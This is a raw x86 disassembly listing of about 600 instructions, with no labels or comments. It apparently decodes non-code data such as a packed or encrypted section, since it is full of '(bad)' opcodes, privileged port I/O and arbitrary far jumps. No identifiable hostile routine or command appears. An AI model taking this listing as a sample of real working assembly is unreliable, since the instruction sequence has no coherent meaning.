  41845d:	xor    DWORD PTR [ebp-0x6b4e96b5],esp
  418463:	cmc    
  418464:	cmp    cl,BYTE PTR [eax]
  418466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418467:	shl    BYTE PTR [eax+0x57],cl
  41846a:	cmp    bl,bh
  41846c:	enter  0xb6fd,0x95
  418470:	pop    eax
  418471:	jnp    0x41844f
  418473:	daa    
  418474:	mov    edx,0xef57606
  418479:	ror    DWORD PTR [eax+0x294ff519],cl
  41847f:	and    ecx,DWORD PTR [ecx+0x5812a5a8]
  418485:	js     0x41849e
  418487:	pop    esi
  418488:	leave  
  418489:	loop   0x41846e
  41848b:	cli    
  41848c:	test   edx,ebx
  41848e:	add    BYTE PTR [ecx],dh
  418490:	outs   dx,DWORD PTR ds:[esi]
  418491:	mov    al,bl
  418493:	outs   dx,BYTE PTR ds:[esi]
  418494:	and    eax,0xc1cd4536
  418499:	dec    edi
  41849a:	popf   
  41849b:	jg     0x418426
  41849d:	test   al,0x6a
  41849f:	nop
  4184a0:	or     ah,cl
  4184a2:	mov    ah,0xcf
  4184a4:	ins    DWORD PTR es:[edi],dx
  4184a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a6:	jb     0x4184da
  4184a8:	sbb    ah,BYTE PTR [edx-0x45d0cf77]
  4184ae:	push   0xc8854651
  4184b3:	enter  0xe479,0x71
  4184b7:	mov    cl,0x49
  4184b9:	mov    edx,0x5944e1eb
  4184be:	inc    edx
  4184bf:	add    ah,BYTE PTR [edx+0x29674199]
  4184c5:	int    0x2e
  4184c7:	js     0x4184b0
  4184c9:	and    al,0xb
  4184cb:	pop    eax
  4184cc:	pop    esp
  4184cd:	in     al,dx
  4184ce:	fadd   QWORD PTR ds:0x9d9c3ade
  4184d4:	jnp    0x418472
  4184d6:	add    DWORD PTR [esi+0x7de0bab],0xffffffb6
  4184dd:	in     al,dx
  4184de:	inc    ebp
  4184df:	stos   BYTE PTR es:[edi],al
  4184e0:	(bad)  
  4184e1:	aam    0xca
  4184e3:	test   DWORD PTR [eax],ebp
  4184e5:	mov    DWORD PTR [edi+0xd],ecx
  4184e8:	cmp    eax,0x9b88d1e2
  4184ed:	jl     0x41852d
  4184ef:	ror    esp,0xbf
  4184f2:	std    
  4184f3:	mov    esp,0xc8e23587
  4184f8:	dec    edx
  4184f9:	pop    edi
  4184fa:	imul   ecx,DWORD PTR [esi+0xe19fb93],0xa1f2d072
  418504:	mov    edx,0x1eee3b1f
  418509:	retf   
  41850a:	push   ecx
  41850b:	push   cs
  41850c:	sbb    al,0xdb
  41850e:	sub    BYTE PTR [ebx],bh
  418510:	jg     0x4184ae
  418512:	rcl    BYTE PTR [esp+edx*4-0x56],cl
  418516:	into   
  418517:	xchg   DWORD PTR [esi+esi*1-0x4dde1b9a],ebx
  41851e:	lods   al,BYTE PTR ds:[esi]
  41851f:	dec    ebp
  418520:	ss xor edx,ebx
  418523:	mov    dl,0xe8
  418525:	jl     0x418515
  418527:	sbb    esp,DWORD PTR [eax+0xb7cd059]
  41852d:	int3   
  41852e:	mov    dl,BYTE PTR [esi+edx*1]
  418531:	mov    dh,BYTE PTR [ebx+0xfa09128]
  418537:	lods   al,BYTE PTR ds:[esi]
  418538:	mov    esp,0x2f36294
  41853d:	adc    al,0xdb
  41853f:	mov    cl,0xc9
  418541:	jae    0x4185b0
  418543:	jle    0x41851e
  418545:	(bad)  
  418546:	fnstenv [edx-0x5415733]
  41854c:	les    edx,FWORD PTR [ebx+0x616e9c81]
  418552:	clc    
  418553:	dec    ecx
  418554:	mov    esp,0x8f926624
  418559:	adc    edi,edi
  41855b:	jl     0x41854b
  41855d:	sahf   
  41855e:	aad    0x4a
  418560:	mov    bh,cl
  418562:	or     al,0x67
  418564:	dec    esp
  418565:	mov    ss,edx
  418567:	and    eax,0x4bc24206
  41856c:	shr    BYTE PTR [edx+0x180f59f1],1
  418572:	or     al,0x4f
  418574:	es popa 
  418576:	int    0x36
  418578:	xchg   edx,eax
  418579:	pop    es
  41857a:	push   eax
  41857b:	cmp    BYTE PTR [ecx+edx*4+0x10],cl
  41857f:	daa    
  418580:	jno    0x4185ff
  418582:	jae    0x4185e9
  418584:	clc    
  418585:	push   eax
  418586:	cli    
  418587:	aaa    
  418588:	bound  edx,QWORD PTR [ecx-0xe258a6c]
  41858e:	(bad)  
  41858f:	jno    0x4185e2
  418591:	mul    BYTE PTR [eax]
  418593:	xor    al,0xff
  418595:	mov    esp,0x293c502f
  41859a:	(bad)  
  41859c:	enter  0xec49,0xc7
  4185a0:	mov    bl,BYTE PTR [esi-0xf]
  4185a3:	jb     0x4185bf
  4185a5:	xchg   esi,eax
  4185a6:	push   0xffffff8a
  4185a8:	aam    0xcc
  4185aa:	sti    
  4185ab:	dec    ecx
  4185ac:	pop    ecx
  4185ad:	fidiv  DWORD PTR [edx]
  4185af:	fs dec ebp
  4185b1:	imul   edi,DWORD PTR [ebx],0xd
  4185b4:	iret   
  4185b5:	cmp    BYTE PTR [esi+0x64],ah
  4185b8:	fs leave 
  4185ba:	pop    esi
  4185bb:	aas    
  4185bc:	mov    esp,0x6185b17
  4185c1:	sti    
  4185c2:	iret   
  4185c3:	jne    0x4185d3
  4185c5:	xchg   edx,eax
  4185c6:	cwde   
  4185c7:	(bad)  
  4185c8:	fcom   DWORD PTR [esi-0x6f]
  4185cb:	addr16 shr bh,0x62
  4185cf:	mov    dl,0xef
  4185d1:	nop
  4185d2:	mov    bl,0x2f
  4185d4:	(bad)  
  4185d5:	sub    DWORD PTR [ebp*2-0xf496a57],ebx
  4185dc:	xor    ah,bl
  4185de:	and    eax,0x7aad2ba3
  4185e3:	scas   eax,DWORD PTR es:[edi]
  4185e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185e5:	imul   ecx,DWORD PTR [ecx-0x281492ea],0xd48f8bff
  4185ef:	js     0x4185be
  4185f1:	icebp  
  4185f2:	jnp    0x418578
  4185f4:	lahf   
  4185f5:	mov    ds,WORD PTR [ecx-0x3b478f9c]
  4185fb:	js     0x4185e0
  4185fd:	dec    ecx
  4185fe:	add    dl,BYTE PTR [ecx+esi*1+0x78]
  418602:	or     cl,0x68
  418605:	test   al,bl
  418607:	jae    0x4185a6
  418609:	sbb    eax,0x3fac79ac
  41860e:	popf   
  41860f:	neg    ebp
  418611:	js     0x418607
  418613:	cdq    
  418614:	or     DWORD PTR [edx+0x6e],esi
  418617:	add    esi,ebx
  418619:	(bad)  
  41861a:	jne    0x4185d8
  41861c:	out    0x2,al
  41861e:	ret    
  41861f:	pop    esi
  418620:	ins    DWORD PTR es:[edi],dx
  418621:	pushf  
  418622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418623:	jg     0x418607
  418625:	or     eax,0x358259ff
  41862a:	es int3 
  41862c:	nop
  41862d:	sbb    BYTE PTR [esi-0x59],dh
  418630:	scas   al,BYTE PTR es:[edi]
  418631:	lods   eax,DWORD PTR ds:[esi]
  418632:	dec    edx
  418633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418634:	and    ebp,DWORD PTR [ecx+ecx*2-0x27]
  418638:	adc    al,BYTE PTR [esi-0x68]
  41863b:	jecxz  0x41860c
  41863d:	fwait
  41863e:	or     eax,0xae107d3
  418643:	sub    edx,eax
  418645:	inc    edx
  418646:	ins    DWORD PTR es:[edi],dx
  418647:	es xchg edi,eax
  418649:	fld    QWORD PTR [ecx-0x12a715a5]
  41864f:	leave  
  418650:	xchg   DWORD PTR [esi+0x37],esp
  418653:	cld    
  418654:	shr    BYTE PTR [ebx+0x68],0x92
  418658:	xor    eax,0x991c60b6
  41865d:	xlat   BYTE PTR ds:[ebx]
  41865e:	sti    
  41865f:	aad    0xc8
  418661:	popf   
  418662:	lock aaa 
  418664:	xchg   DWORD PTR [edx+ebp*4],esp
  418667:	mov    ecx,edi
  418669:	push   ebp
  41866a:	scas   al,BYTE PTR es:[edi]
  41866b:	sub    edx,edx
  41866d:	mov    esp,0xc50de847
  418672:	and    edx,DWORD PTR [edi]
  418674:	icebp  
  418675:	xchg   esp,eax
  418676:	test   eax,0xc1b42c8e
  41867b:	sub    eax,0x48c0bd3f
  418680:	or     DWORD PTR [edx],esp
  418682:	or     al,0xb4
  418684:	lods   al,BYTE PTR ds:[esi]
  418685:	in     eax,0x41
  418687:	outs   dx,BYTE PTR ds:[esi]
  418688:	or     ebp,0xffffffa1
  41868b:	sbb    esp,esi
  41868d:	lods   al,BYTE PTR ds:[esi]
  41868e:	pop    edi
  41868f:	aas    
  418690:	fwait
  418691:	add    ebx,ebx
  418693:	sahf   
  418694:	dec    ebp
  418695:	ror    BYTE PTR [ecx+0x72a837e8],cl
  41869b:	hlt    
  41869c:	and    al,0xc9
  41869e:	iret   
  41869f:	sahf   
  4186a0:	fadd   DWORD PTR [eax+0x21c61343]
  4186a6:	ja     0x41870e
  4186a8:	ds jmp 0xc7c12b78
  4186ae:	jmp    FWORD PTR [eax+0x524bbb72]
  4186b4:	xchg   esp,eax
  4186b5:	xchg   ecx,eax
  4186b6:	sbb    al,0xaa
  4186b8:	push   0xca9efec3
  4186bd:	pop    ebp
  4186be:	ret    0xb424
  4186c1:	adc    DWORD PTR [esp+ebx*1],edx
  4186c4:	cmc    
  4186c5:	rol    BYTE PTR [eax+0x5c79a70c],cl
  4186cb:	pop    es
  4186cc:	push   ecx
  4186cd:	jmp    0x99c702cb
  4186d2:	mov    edx,0xc52b5c45
  4186d7:	jo     0x4186ed
  4186d9:	call   0x7e0b594c
  4186de:	dec    DWORD PTR [edx+0x15]
  4186e1:	enter  0x56b5,0x33
  4186e5:	and    bh,BYTE PTR [ebx-0x7829aa78]
  4186eb:	std    
  4186ec:	jmp    0x391e2c49
  4186f1:	fs adc esp,esp
  4186f4:	mov    ch,0x8
  4186f6:	dec    esp
  4186f7:	dec    eax
  4186f8:	stos   DWORD PTR es:[edi],eax
  4186f9:	stos   BYTE PTR es:[edi],al
  4186fa:	shr    esi,cl
  4186fc:	push   cs
  4186fd:	jp     0x41876a
  4186ff:	push   eax
  418700:	mov    WORD PTR [edi+0x2a381054],ds
  418706:	pusha  
  418707:	sub    eax,0x5425c56c
  41870c:	cmc    
  41870d:	in     al,dx
  41870e:	pop    esi
  41870f:	ins    DWORD PTR es:[edi],dx
  418710:	push   ds
  418711:	mov    ecx,0x40275432
  418716:	fcom   st(2)
  418718:	push   0xdde424ff
  41871d:	into   
  41871e:	test   al,0x2c
  418720:	push   0x7e2f1388
  418725:	fs addr16 sub bh,ch
  418729:	inc    ebp
  41872a:	jg     0x4187a7
  41872c:	or     DWORD PTR [ebp+0x6f],0xc689dcd2
  418733:	and    ecx,ebp
  418735:	xor    eax,0xe8ee26f5
  41873a:	and    ebx,edx
  41873c:	imul   ebp,DWORD PTR [eax+0x6d780395],0xd
  418743:	mov    BYTE PTR [ecx+0x5f],bl
  418746:	mov    al,ds:0x54cccc95
  41874b:	int    0x48
  41874d:	mov    edx,0x6b69958e
  418752:	cmp    BYTE PTR [ebx-0x3c661f34],bh
  418758:	repz in al,0xf3
  41875b:	aad    0x32
  41875d:	sub    bh,al
  41875f:	adc    BYTE PTR ds:0x7de5b13c,ah
  418765:	mov    esp,0xe475263
  41876a:	mov    dl,0x65
  41876c:	(bad)  
  41876d:	test   DWORD PTR [ebx],esi
  41876f:	test   edi,0x2bb60d1d
  418775:	mov    ah,0xa0
  418777:	or     eax,ebx
  418779:	cmp    ch,al
  41877b:	dec    ebp
  41877c:	fucomi st,st(5)
  41877e:	adc    bh,cl
  418780:	mov    bh,0xe0
  418782:	ja     0x418797
  418784:	rcl    DWORD PTR [ebp-0x72],cl
  418787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418788:	fidivr DWORD PTR [ebp-0x76]
  41878b:	lods   al,BYTE PTR ds:[esi]
  41878c:	fild   WORD PTR [edi+0x36b007e0]
  418792:	mov    cl,0xa6
  418794:	jmp    0xa563:0x5be5cc24
  41879b:	aas    
  41879c:	icebp  
  41879d:	loop   0x418753
  41879f:	(bad)  
  4187a0:	adc    BYTE PTR [ebx-0x7d],dl
  4187a3:	(bad)  
  4187a5:	int3   
  4187a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a7:	int3   
  4187a8:	in     al,0x97
  4187aa:	fst    QWORD PTR [ecx-0x2dc0dfb6]
  4187b0:	dec    ecx
  4187b1:	sti    
  4187b2:	pushf  
  4187b3:	sbb    eax,0x5ca1b3
  4187b8:	int3   
  4187b9:	pop    esi
  4187ba:	cmp    DWORD PTR [edx+0x7806bc16],ebx
  4187c0:	hlt    
  4187c1:	(bad)  [esi+ebx*1-0x3164cec9]
  4187c8:	or     BYTE PTR [ecx],0x58
  4187cb:	inc    edx
  4187cc:	xchg   ecx,eax
  4187cd:	imul   ebp,DWORD PTR [esi],0x67f5f8e7
  4187d3:	push   esp
  4187d4:	mov    dl,0x25
  4187d6:	mov    BYTE PTR [edx-0x38eece88],cl
  4187dc:	enter  0x822d,0x90
  4187e0:	mov    al,ds:0xb5a42dc
  4187e5:	pop    ecx
  4187e6:	fldcw  WORD PTR [esi+0x51a49e38]
  4187ec:	push   eax
  4187ed:	jb     0x418817
  4187ef:	ret    
  4187f0:	nop/reserved BYTE PTR [ebx+0x374c60ae]
  4187f7:	mov    bl,0x3a
  4187f9:	jl     0x418814
  4187fb:	mov    BYTE PTR [ebx-0x7487678],bh
  418801:	sti    
  418802:	push   es
  418803:	jmp    0x418870
  418805:	xchg   ecx,eax
  418806:	stc    
  418807:	nop
  418808:	repnz xor bl,BYTE PTR fs:[ebx-0x6d15740e]
  418810:	mov    ebp,0x67179414
  418815:	mov    ah,BYTE PTR ds:0x8372b5c6
  41881b:	fiadd  WORD PTR [ecx+0x590f4356]
  418821:	call   DWORD PTR [ebp+0x67a3505]
  418827:	cmp    BYTE PTR [edi+0x2b],dh
  41882a:	cmp    edi,edx
  41882c:	sbb    al,0x6d
  41882e:	and    bl,dh
  418830:	mov    ebx,0x14a84a6f
  418835:	call   0x5712:0x2f842b16
  41883c:	xor    BYTE PTR [ecx-0x1],al
  41883f:	inc    eax
  418840:	and    BYTE PTR [ebx+eax*2],al
  418843:	addr16 repz fs jmp 0xf129c6a6
  41884b:	pop    eax
  41884c:	scas   eax,DWORD PTR es:[edi]
  41884d:	mov    eax,0x812cbd13
  418852:	in     al,dx
  418853:	sub    al,0x4e
  418855:	sbb    eax,0x99fba318
  41885a:	adc    al,0x51
  41885c:	cmp    al,0xa5
  41885e:	adc    ch,BYTE PTR [edi-0x2a]
  418861:	icebp  
  418862:	bswap  edi
  418864:	fcmovnu st,st(3)
  418866:	or     al,BYTE PTR ds:0x1ef9b0ce
  41886c:	sbb    BYTE PTR [esi],ah
  41886e:	scas   eax,DWORD PTR es:[edi]
  41886f:	iret   
  418870:	and    DWORD PTR [ecx],0x4b7e92db
  418876:	mov    ecx,0xd86701ac
  41887b:	push   edi
  41887c:	ror    BYTE PTR [edx+edi*8],1
  41887f:	jp     0x418822
  418881:	sbb    dh,BYTE PTR [eax+ebp*1]
  418884:	fstp   st(5)
  418886:	addr16 aad 0xb7
  418889:	xchg   edi,eax
  41888a:	adc    esi,DWORD PTR [edi]
  41888c:	and    al,0xfd
  41888e:	and    ecx,DWORD PTR [ecx]
  418890:	jge    0x41890e
  418892:	pop    es
  418893:	fwait
  418894:	push   ecx
  418895:	stc    
  418896:	aaa    
  418897:	jnp    0x418859
  418899:	inc    ecx
  41889a:	lods   al,BYTE PTR ds:[esi]
  41889b:	xor    edi,DWORD PTR [edi]
  41889d:	cs (bad) 
  41889f:	sbb    eax,0x81fea100
  4188a4:	adc    eax,0xc598fad9
  4188a9:	ins    BYTE PTR es:[edi],dx
  4188aa:	xlat   BYTE PTR ds:[ebx]
  4188ab:	call   0xdb2bd15b
  4188b0:	and    ebx,DWORD PTR [ebx+0x3d]
  4188b3:	adc    dl,0x83
  4188b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188b7:	and    al,0x89
  4188b9:	outs   dx,BYTE PTR ds:[esi]
  4188ba:	in     al,0x0
  4188bc:	inc    ebp
  4188bd:	jg     0x418853
  4188bf:	sub    BYTE PTR [esi],ch
  4188c1:	mov    ebx,0x241141c4
  4188c6:	xor    al,0xa
  4188c8:	jmp    0x4188d5
  4188ca:	inc    esp
  4188cb:	adc    al,0x74
  4188cd:	push   esp
  4188ce:	(bad)  
  4188cf:	fisub  DWORD PTR ds:0xf430994f
  4188d5:	jp     0x4188c5
  4188d7:	aas    
  4188d8:	mov    esi,0x99fa3525
  4188dd:	in     al,dx
  4188de:	pusha  
  4188df:	daa    
  4188e0:	mov    ebp,0x1dd9a7f6
  4188e5:	or     BYTE PTR [ebp+0x2e],0xfc
  4188e9:	repz test DWORD PTR [ebp+0x5f],ecx
  4188ed:	push   es
  4188ee:	out    dx,eax
  4188ef:	dec    edx
  4188f0:	dec    ecx
  4188f1:	or     BYTE PTR [edi-0x26f80dd7],cl
  4188f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f8:	xchg   ebp,eax
  4188f9:	sahf   
  4188fa:	ja     0x418972
  4188fc:	jmp    0xead3:0xcddeb7c5
  418903:	mov    ebp,0xb0a18da1
  418908:	lods   al,BYTE PTR ds:[esi]
  418909:	ret    
  41890a:	adc    eax,0xbe41025a
  41890f:	out    dx,eax
  418910:	neg    DWORD PTR [edx+0x4e]
  418913:	mov    ds:0x6f41149,eax
  418918:	sub    ah,BYTE PTR [esi]
  41891a:	repnz out dx,al
  41891c:	inc    ebp
  41891d:	xor    eax,0x9a6923d7
  418922:	ror    BYTE PTR [esi-0x4237b392],cl
  418928:	repz loope 0x4188d2
  41892b:	and    eax,0x72478d57
  418930:	daa    
  418931:	mov    eax,ds:0xbd341990
  418936:	mov    edi,0xba05e95
  41893b:	mov    ebp,edx
  41893d:	mov    esp,0x3a97d51c
  418942:	jns    0x4188f0
  418944:	neg    BYTE PTR [edx+0x1a]
  418947:	test   DWORD PTR [esp+ebx*1+0x759780d2],eax
  41894e:	dec    esp
  41894f:	scas   eax,DWORD PTR es:[edi]
  418950:	lods   al,BYTE PTR ds:[esi]
  418951:	push   es
  418952:	push   esp
  418953:	pop    edi
  418954:	dec    ecx
  418955:	test   BYTE PTR [ebx-0x3f7856e1],0xfd
  41895c:	mov    ecx,DWORD PTR [edi]
  41895e:	test   ah,ah
  418960:	or     DWORD PTR [ebp+0x47],0x33e2e767
  418967:	in     al,dx
  418968:	fmul   st(3),st
  41896a:	mov    ebx,0x7002ab3f
  41896f:	and    DWORD PTR [ebp+0x2b],esi
  418972:	fwait
  418973:	or     DWORD PTR [ebp-0x8],ecx
  418976:	icebp  
  418977:	mov    ah,0x42
  418979:	push   edx
  41897a:	clc    
  41897b:	pop    ebp
  41897c:	repz int 0x59
  41897f:	(bad)  
  418980:	cld    
  418981:	iret   
  418982:	cmp    DWORD PTR [edi],ebx
  418984:	push   0xccdb7c95
  418989:	jnp    0x418952
  41898b:	add    eax,0xc4058c98
  418990:	mov    ch,0xe3
  418992:	aam    0x93
  418994:	frstor [edx-0x19]
  418997:	pushf  
  418998:	sti    
  418999:	sub    al,0xcc
  41899b:	stc    
  41899c:	inc    ebx
  41899d:	xor    al,0x9f
  41899f:	rcl    DWORD PTR [ebx],0x8c
  4189a2:	cmp    ch,cl
  4189a4:	aaa    
  4189a5:	or     BYTE PTR [edi-0x9f6d30d],bl
  4189ab:	jno    0x4189f1
  4189ad:	std    
  4189ae:	sti    
  4189af:	adc    DWORD PTR [ebx],esi
  4189b1:	fstp   DWORD PTR ds:0xc7fe7fd
  4189b7:	and    DWORD PTR [ebp+0xfb749a8],eax
  4189bd:	out    dx,eax
  4189be:	in     al,dx
  4189bf:	div    edi
  4189c1:	mov    dl,0x8d
  4189c3:	mov    edi,ebp
  4189c5:	mov    dh,0x39
  4189c7:	cwde   
  4189c8:	add    BYTE PTR [ecx+0x2d086f0d],al
  4189ce:	mov    al,ds:0xa5799b6b
  4189d3:	cmp    BYTE PTR [ecx-0x39adb06b],bl
  4189d9:	lods   al,BYTE PTR ds:[esi]
  4189da:	lods   al,BYTE PTR gs:[esi]
  4189dc:	sbb    edx,DWORD PTR [ebp+0x65]
  4189df:	pushf  
  4189e0:	fcomp  QWORD PTR [ebx]
  4189e2:	neg    DWORD PTR [ebx-0x58]
  4189e5:	add    al,0x3f
  4189e7:	pop    esi
  4189e8:	cld    
  4189e9:	push   es
  4189ea:	stos   BYTE PTR es:[edi],al
  4189eb:	inc    ecx
  4189ec:	imul   edx,DWORD PTR [edx],0x2a
  4189ef:	cmp    DWORD PTR [ebx-0x46],esp
  4189f2:	push   ebx
  4189f3:	inc    esi
  4189f4:	or     BYTE PTR [ecx+esi*1],bh
  4189f7:	mov    ebx,0x279c40fe
  4189fc:	imul   esi,DWORD PTR [eax+ebp*2],0x1b
  418a00:	xlat   BYTE PTR ds:[ebx]
  418a01:	inc    ecx
  418a02:	xchg   ecx,eax
  418a03:	fnstenv [eax-0x37]
  418a06:	cmp    edi,DWORD PTR [ecx]
  418a08:	loopne 0x4189c9
  418a0a:	sub    cl,bh
  418a0c:	into   
  418a0d:	pop    esp
  418a0e:	xor    ch,bh
  418a10:	js     0x4189b7
  418a12:	mov    eax,ds:0xea1295ff
  418a17:	sub    ebx,edi
  418a19:	xchg   ecx,eax
  418a1a:	jns    0x418a69
  418a1c:	sbb    bh,al
  418a1e:	and    ch,BYTE PTR [edx]
  418a20:	sub    BYTE PTR [ebx],cl
  418a22:	enter  0x4ac9,0x38
  418a26:	xchg   eax,edx
  418a28:	popa   
  418a29:	adc    BYTE PTR ds:0x1f92c7aa,dh
  418a2f:	and    bl,BYTE PTR [edx]
  418a31:	lock (bad) 
  418a33:	in     al,dx
  418a34:	mov    al,0xe0
  418a36:	test   DWORD PTR [eax],esi
  418a38:	xor    bh,BYTE PTR [esp+ebp*4+0x5b]
  418a3c:	cmp    al,0xb7
  418a3e:	arpl   WORD PTR [ebx+edx*4],cx
  418a41:	ret    0x83dd
  418a44:	push   0x6f
  418a46:	adc    dh,ah
  418a48:	cmpps  xmm3,XMMWORD PTR [esi+0x2f915aec],0x8c
  418a50:	xlat   BYTE PTR ds:[ebx]
  418a51:	add    DWORD PTR [ebx-0x7bb55180],esi
  418a57:	mov    ds:0xa18c4fc5,eax
  418a5c:	xchg   BYTE PTR [eax+0x5f],bh
  418a5f:	or     al,0x86
  418a61:	add    DWORD PTR [esp+eax*2-0x5850bfa7],0x36
  418a69:	in     al,dx
  418a6a:	pop    ebx
  418a6b:	or     DWORD PTR [eax+0x4b7db01d],ebx
  418a71:	lahf   
  418a72:	or     eax,DWORD PTR [eax+eiz*2]
  418a75:	or     BYTE PTR [esi-0x64],0x19
  418a79:	mov    edx,0x2aac62d7
  418a7e:	adc    al,0xd1
  418a80:	add    esi,DWORD PTR [ebp-0x4b8c8643]
  418a86:	add    edx,ebx
  418a88:	and    al,0xbf
  418a8a:	(bad)  
  418a8b:	retf   0x1d
  418a8e:	rol    DWORD PTR [edx],1
  418a90:	xchg   esp,eax
  418a91:	scas   eax,DWORD PTR es:[edi]
  418a92:	sbb    ebx,eax
  418a94:	jg     0x418a9b
  418a96:	mov    ds:0x787c09dd,al
  418a9b:	jb     0x418a7f
  418a9d:	aaa    
  418a9e:	push   esi
  418a9f:	mov    eax,0xeec40835
  418aa4:	xchg   ebp,eax
  418aa5:	pop    si
  418aa7:	std    
  418aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa9:	mov    edx,0xd0989c0b
  418aae:	arpl   bx,sp
  418ab0:	add    BYTE PTR [edi+0x76],dh
  418ab3:	icebp  
  418ab4:	ret    
  418ab5:	xlat   BYTE PTR ds:[ebx]
  418ab6:	push   ss
  418ab7:	dec    esi
  418ab8:	loop   0x418a67
  418aba:	mov    ?,eax
  418abc:	or     DWORD PTR [edi+0x3e],edi
  418abf:	mov    ebp,0x74b17a08
  418ac4:	jnp    0x418ad0
  418ac6:	je     0x418b07
  418ac8:	mov    al,ds:0xeb619fb7
  418acd:	jno    0x418a8e
  418acf:	pop    edi
  418ad0:	iret   
  418ad1:	in     eax,dx
  418ad2:	sbb    edx,edx
  418ad4:	push   edx
  418ad5:	sub    DWORD PTR [eax+esi*8-0x1d4f6cd6],eax
  418adc:	inc    edx
  418add:	inc    ebp
  418ade:	in     eax,0x3d
  418ae0:	mov    eax,ds:0xdd067317
  418ae5:	cdq    
  418ae6:	ins    DWORD PTR es:[edi],dx
  418ae7:	add    BYTE PTR [ebx],bh
  418ae9:	and    eax,0xe4319dd8
  418aee:	push   es
  418aef:	jno    0x418b5f
  418af1:	add    eax,0xad443aa0
  418af6:	inc    esp
  418af7:	inc    esi
  418af8:	out    dx,al
  418af9:	adc    dl,bh
  418afb:	in     al,0x5
  418afd:	pop    ss
  418afe:	in     al,0xf5
  418b00:	ins    BYTE PTR es:[edi],dx
  418b01:	sbb    eax,0x81eab429
  418b06:	push   0x767fb45b
  418b0b:	mov    DWORD PTR [edx-0x3d6fd4d1],0xda8d9346
  418b15:	adc    al,0x69
  418b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b18:	nop
  418b19:	mov    ?,WORD PTR [ebx]
  418b1b:	sti    
  418b1c:	mov    ds:0xd6713f96,al
  418b21:	not    BYTE PTR gs:[ebp-0x2e]
  418b25:	add    BYTE PTR [esi+0x6462cb56],0x55
  418b2c:	mov    ecx,DWORD PTR [ebp-0x6a]
  418b2f:	and    al,0x8e
  418b31:	sub    DWORD PTR [edx],edi
  418b33:	sub    eax,0x764eabee
  418b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b39:	add    ebp,DWORD PTR [ebx]
  418b3b:	mov    esi,DWORD PTR [edx-0x15c96c5b]
  418b41:	mov    dh,0x1b
  418b43:	sub    eax,DWORD PTR [ebp+0x4e]
  418b46:	pop    esp
  418b47:	outs   dx,DWORD PTR ds:[esi]
  418b48:	imul   esp,ebx,0x53
  418b4b:	mov    cl,0xaa
  418b4d:	sub    BYTE PTR [ebx],cl
  418b4f:	or     eax,0xd26fce5e
  418b54:	in     al,dx
  418b55:	retf   0x9761
  418b58:	jp     0x418b5d
  418b5a:	nop
  418b5b:	(bad)  
  418b5c:	adc    DWORD PTR [ebp+0x5eac865],0x21f5a6be
  418b66:	adc    esp,DWORD PTR [edx]
  418b68:	call   0x3e5472fa
  418b6d:	add    edx,DWORD PTR [ebp+0x0]
  418b70:	call   0xd4dc241b
  418b75:	mov    ds:0xf2108476,al
  418b7a:	rep lods al,BYTE PTR ds:[esi]
  418b7c:	xchg   edx,eax
  418b7d:	jnp    0x418ba7
  418b7f:	mov    al,0x65
  418b81:	int3   
  418b82:	mov    edi,0xb8ee92b9
  418b87:	ret    
  418b88:	push   edx
  418b89:	div    BYTE PTR [esi-0x51]
  418b8c:	push   ss
  418b8d:	test   eax,0x79e077fb
  418b92:	in     eax,0x4
  418b94:	cli    
  418b95:	adc    ebp,DWORD PTR [edi-0x63]
  418b98:	jmp    0x418b99
  418b9a:	test   DWORD PTR [esi+esi*2-0x70],eax
  418b9e:	mov    ds:0x3fe0bf47,eax
  418ba3:	ficom  DWORD PTR [edx+0x2a]
  418ba6:	and    bl,bh
  418ba8:	stos   DWORD PTR es:[edi],eax
  418ba9:	out    dx,al
  418baa:	pop    ebx
  418bab:	adc    al,0x22
  418bad:	push   ecx
  418bae:	cmc    
  418baf:	mov    ds:0x4f35a987,eax
  418bb4:	popf   
  418bb5:	inc    esp
  418bb6:	jg     0x418c15
  418bb8:	xor    bh,dl
  418bba:	jmp    0x20b7:0xdc424668
  418bc1:	add    DWORD PTR [edx-0x70],edx
  418bc4:	iret   
  418bc5:	xchg   BYTE PTR ds:0x853d533e,bl
  418bcb:	mov    ebp,0xb61a7c5e
  418bd0:	jp     0x418b78
  418bd2:	leave  
  418bd3:	and    DWORD PTR [ebp-0x3],ebx
  418bd6:	std    
  418bd7:	inc    eax
  418bd8:	lock fwait
  418bda:	push   0xffffffbb
  418bdc:	push   ebp
  418bdd:	inc    edi
  418bde:	loope  0x418c28
  418be0:	stc    
  418be1:	mov    al,ds:0x718ac2b2
  418be6:	jno    0x418bcd
  418be8:	sub    bl,BYTE PTR [esi+edx*2+0x536449c1]
  418bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf0:	sbb    DWORD PTR [edi+0x22],0x833921a4
  418bf7:	xchg   ebx,eax
  418bf8:	push   es
  418bf9:	out    dx,eax
  418bfa:	call   0xeced:0x24a60e4
  418c01:	pop    esp
  418c02:	hlt    
  418c03:	add    ecx,edx
  418c05:	test   eax,0x184efe34
  418c0a:	leave  
  418c0b:	and    DWORD PTR [esp+ebp*4+0x78552106],ebp
  418c12:	pop    esi
  418c13:	and    eax,0xc33692dd
  418c18:	jle    0x418c24
  418c1a:	xabort 0xc5
  418c1d:	test   BYTE PTR [ebx+0x2b],al
  418c20:	jle    0x418c11
  418c22:	push   ds
  418c23:	mov    edx,0x8048e329
  418c28:	sub    DWORD PTR [esi],ecx
  418c2a:	(bad)  
  418c2c:	shr    DWORD PTR [ebx-0x7d472263],cl
  418c32:	xchg   ecx,eax
  418c33:	(bad)  
  418c34:	je     0x418cb3
  418c36:	inc    ecx
  418c37:	aam    0x9f
  418c39:	aaa    
  418c3a:	in     eax,0xaf
  418c3c:	jbe    0x418c24
  418c3e:	cmp    ebp,DWORD PTR [esi-0xe]
  418c41:	daa    
  418c42:	or     eax,0xc75adfc1
  418c47:	mov    ds:0x26064f8d,eax
  418c4d:	xchg   ecx,eax
